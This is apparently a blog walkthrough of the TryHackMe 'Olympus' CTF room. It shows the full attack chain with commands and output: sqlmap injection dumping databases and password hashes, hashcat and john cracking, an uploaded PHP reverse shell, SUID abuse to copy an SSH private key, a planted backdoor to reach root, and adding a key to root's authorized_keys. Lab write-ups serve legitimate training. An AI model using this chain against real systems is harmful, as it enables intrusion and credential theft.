---
title: "TryHackMe: Olympus"
author: cilgin
date: 2025-06-29 19:51:50 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-29-TryHackMe-Olympus/main.png
---

Hi

---

```bash
export IP=10.10.85.12
```

typical nmap scan

```bash
❯ nmap -A -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-29 20:08 +0300
Nmap scan report for olympus.thm (10.10.85.12)
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:d5:56:cd:de:f2:25:02:3f:ac:8f:1f:13:93:87:da (RSA)
|   256 8e:79:67:bf:ba:b3:01:9a:47:00:ca:c1:28:8c:79:7a (ECDSA)
|_  256 a1:ae:62:c2:24:94:4d:d3:b6:c8:30:87:76:a6:10:fe (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Olympus
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 611.24 seconds
```

In browster I go to the website and redirected to olympus.thm
Add the ip address to the /etc/hosts

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo1.png){: width="972" height="589" }

We can see that site is under development. And saying old version of this site is under this domain.
So we can fuzz all the subdomains for this domain.

Fuzzing time using `gobuster`

I fuzzed all the subdomains using gobuster but found nothing so after that i tried fuzzing directories.

```bash
❯ gobuster dir -w common.txt -u http://olympus.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1948]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]

===============================================================
Finished
===============================================================
```

We can see that there is a phpmyadmin is existed.
Maybe we can later try to get into that.

And finded ~webmaster which contains the old site.

After that I fuzzde the old site:

```bash
❯ gobuster dir -w common.txt -u http://olympus.thm/~webmaster/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/~webmaster/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/LICENSE              (Status: 200) [Size: 1070]
/README.md            (Status: 200) [Size: 2146]
/admin                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/admin/]
/category.php         (Status: 200) [Size: 6650]
/css                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/css/]
/fonts                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/fonts/]
/img                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/img/]
/includes             (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/includes/]
/index.php            (Status: 200) [Size: 9386]
/index.php            (Status: 200) [Size: 9386]
/js                   (Status: 301) [Size: 318] [--> http://olympus.thm/~webmaster/js/]
/search.php           (Status: 200) [Size: 6621]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

There is admin panel maybe i can fuzz that.

Also there is search.php maybe i can use that file to make sql injection.

```bash
❯ gobuster dir -w common.txt -u http://olympus.thm/~webmaster/admin/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/~webmaster/admin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,js,html,php,py,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/categories.php       (Status: 302) [Size: 9799] [--> ../index.php]
/comment.php          (Status: 302) [Size: 7778] [--> ../index.php]
/css                  (Status: 301) [Size: 325] [--> http://olympus.thm/~webmaster/admin/css/]
/fonts                (Status: 301) [Size: 327] [--> http://olympus.thm/~webmaster/admin/fonts/]
/function.php         (Status: 200) [Size: 0]
/img                  (Status: 301) [Size: 325] [--> http://olympus.thm/~webmaster/admin/img/]
/includes             (Status: 301) [Size: 330] [--> http://olympus.thm/~webmaster/admin/includes/]
/index.php            (Status: 302) [Size: 11408] [--> ../index.php]
/index.php            (Status: 302) [Size: 11408] [--> ../index.php]
/js                   (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/admin/js/]
/posts.php            (Status: 302) [Size: 9684] [--> ../index.php]
/profile.php          (Status: 302) [Size: 7410] [--> ../index.php]
/users.php            (Status: 302) [Size: 9070] [--> ../index.php]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

We can see that a lot of the paths redirecs to the normal site.
But there is function.php which is empty and some paths which includes libraries for code.
We can go to the js libraries.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo2.png){: width="972" height="589" }

As you can this site uses jquerry 1.9.1 and some plugins. Maybe we can check that if the plugins or this jqurry version have vulns.

And this jquerry version have CVE-2019-11358 but I don't think it is usable beacuse it is client side.

So turn back to the sql injection part:

Maybe before that we need to google some victor Cms vulns.

And I found one.
<https://www.exploit-db.com/exploits/48734>

We can use this command:

```bash
sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
```

And than we can get the flag

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus -T flag --columns --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

Database: olympus
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
+---------------------------+
| flag                      |
+---------------------------+
| flag{*******************} |
+---------------------------+

[*] ending @ 21:23:00 /2025-06-29/
```

Now its time to check out the users.

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 0 -D olympus -T users --columns --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

Database: olympus
Table: users
[9 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| randsalt       | varchar(255) |
| user_email     | varchar(255) |
| user_firstname | varchar(255) |
| user_id        | int          |
| user_image     | text         |
| user_lastname  | varchar(255) |
| user_name      | varchar(255) |
| user_password  | varchar(255) |
| user_role      | varchar(255) |
+----------------+--------------+

Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+


[*] ending @ 21:26:31 /2025-06-29/
```

As you can see there root and zeus has chat.olympus domains. We probably my wordlist little small for the job beacause when i tried to fuzz the subdomains i didn't find this one. Whatever lets go to the subdomain.

Before this add the subdomain to the /etc/hosts.

And we got login screen.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo3.png){: width="972" height="589" }

Maybe we can try cracking bcrypt'ed passwords.

```bash
❯ hashcat -m 3200 -a 0 hash/hash.txt rockyou.txt
hashcat (v6.2.6) starting

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:*********

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2...Dvnj3C
```

And prometheus one worked just fine.

I tried cracking admin too but I can't cracked it.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo4.png){: width="972" height="589" }

I think we can upload a php reverse shell file and open that. But we need to find the name of the filename.

First fuzzing the site using gobuster.

```bash
❯ gobuster dir -w common.txt -u http://chat.olympus.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.olympus.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              md,js,html,php,py,css,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/config.php           (Status: 200) [Size: 0]
/home.php             (Status: 302) [Size: 0] [--> login.php]
/index.php            (Status: 302) [Size: 0] [--> login.php]
/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/phpmyadmin           (Status: 403) [Size: 281]
/server-status        (Status: 403) [Size: 281]
/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
/upload.php           (Status: 200) [Size: 112]
/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

And there is a uploads folder we can look inside.
But firstly upload a png named 0.png

And tried fuzzing uploads directory:

```bash
❯ gobuster dir -w common.txt -u http://chat.olympus.thm/uploads/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.olympus.thm/uploads/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,py,css,txt,md,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 0]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

And we can't find it.

Maybe we can just upload the php reverse shell and it works maybe?
And it not works so maybe we can try making sql request to find the file.

But wait haven't i tried to log in webmaster admin page. yes ı forgot to do that.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo4.png){: width="972" height="589" }

And I'm in second time.

I looked througt the site little bit but there is nothing I can use i think or i'd skipped something.

So I go back to chat site again:
And maked a sql request:

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 0 -D olympus -T chats --columns --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

Database: olympus
Table: chats
[4 columns]
+--------+------+
| Column | Type |
+--------+------+
| file   | text |
| dt     | date |
| msg    | text |
| uname  | text |
+--------+------+

Database: olympus
Table: chats
[13 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
| 2025-06-30 | Fuck you all\r\n                                                                                                                                                | prometheus | <blank>                              |
| 2025-06-30 | Attached : 0.png                                                                                                                                                | prometheus | bd5acd83d371ee09ba1e667ec971a153.png |
| 2025-06-30 | Attached : 0.png                                                                                                                                                | prometheus | 00efe9b698b8b5f833b00957d095addd.png |
| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 164b9df71fdb3a25338bb57c8c42ca3d.php |
| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 13ae443071b51422eaf91fe755fa2dd1.php |
| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | efa614e8934d24d3c969ac555c7c6657.php |
| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 566295ce0926ec7f6fbc9ccea2f254ca.php |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+


[*] ending @ 22:11:18 /2025-06-29/
```

And I found the filepaths. I use pentestmonkeys php reverse shell script btw. You can use whatever you want.

```bash
❯ curl http://chat.olympus.thm/uploads/566295ce0926ec7f6fbc9ccea2f254ca.php
```

And I got the shell now.

Quickly upgrade the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color

stty raw -echo;fg
reset
```

```bash
www-data@ip-10-10-85-12:/$ cd /home
www-data@ip-10-10-85-12:/home$ ls
ubuntu	zeus
www-data@ip-10-10-85-12:/home$ cd zeus
www-data@ip-10-10-85-12:/home/zeus$ ls
snap  user.flag  zeus.txt
www-data@ip-10-10-85-12:/home/zeus$ ls -la
total 48
drwxr-xr-x 7 zeus zeus 4096 Apr 19  2022 .
drwxr-xr-x 4 root root 4096 Jun 29 16:54 ..
lrwxrwxrwx 1 root root    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus 3771 Feb 25  2020 .bashrc
drwx------ 2 zeus zeus 4096 Mar 22  2022 .cache
drwx------ 3 zeus zeus 4096 Apr 14  2022 .gnupg
drwxrwxr-x 3 zeus zeus 4096 Mar 23  2022 .local
-rw-r--r-- 1 zeus zeus  807 Feb 25  2020 .profile
drwx------ 2 zeus zeus 4096 Apr 14  2022 .ssh
-rw-r--r-- 1 zeus zeus    0 Mar 22  2022 .sudo_as_admin_successful
drwx------ 3 zeus zeus 4096 Apr 14  2022 snap
-rw-rw-r-- 1 zeus zeus   34 Mar 23  2022 user.flag
-r--r--r-- 1 zeus zeus  199 Apr 15  2022 zeus.txt
www-data@ip-10-10-85-12:/home/zeus$ cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



						- Prometheus.
```

Wow prometheus you are more than a metrics server I guess.

Anyways we got the flag:

```bash
www-data@ip-10-10-85-12:/home/zeus$ ls
snap  user.flag  zeus.txt
www-data@ip-10-10-85-12:/home/zeus$ cat user.flag
flag{***************************}
```

Linpeas time has come.

And I found this binary:

```bash
www-data@ip-10-10-85-12:/$ ls -la /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```

So It's a file mover but with zeus privilages:

```bash
www-data@ip-10-10-85-12:/$ cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /tmp/id_rsa

File copied successfully.
```

And I copy the ssh key and connect zeus with ssh.

```bash
❯ chmod 400 /tmp/id_rsa

~
❯ ssh zeus@olympus.thm -i /tmp/id_rsa
Enter passphrase for key '/tmp/id_rsa':
```

And It got a password. Frustrating. Whatever lets crack that using john:

```bash
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john --show ssh.hash
key:**********
```

Now i can log in as a zeus:

Again It's time or linpeas

I can't find good info with linpeas.

I look throught all the filesytem and find some weird folder on the /var/www/html
In this folder there is php file which is a backdoor.

If you look throught the code you can see that this code executes:

```bash
uname -a; w;/lib/defended/libc.so.99
```

So we can execute that my hand.

And we get the root shell:

```bash
whoami
root
```

```bash
cat root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{******************)_}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```

Ok Now we need to fing a secret flag

Firstly log in as a root with ssh:

1. Add you public key to the root/.ssh/authorized_keys

2. `ssh root@olympus.thm`

Now we can try to get all the word which starts with flag{ with this command:

```bash
find . -type f -exec cat {} + > output.txt
```

Even with grep there will be some crappy binary in this file. So after this command finishes I'll use vim to search throught flag{

But never be me beacuse I run vim in the target machine rather than downloading the file and running in my system now system crashed out a little bit.

Anyways If you don't want use this command. the secret flag is on /etc/ssl/private.

```bash
root@ip-10-10-85-12:/etc/ssl/private# cat .b0nus.fl4g
Here is the final flag ! Congrats !

flag{*****************}


As a reminder, here is a usefull regex :

grep -irl flag{




Hope you liked the room ;)
```
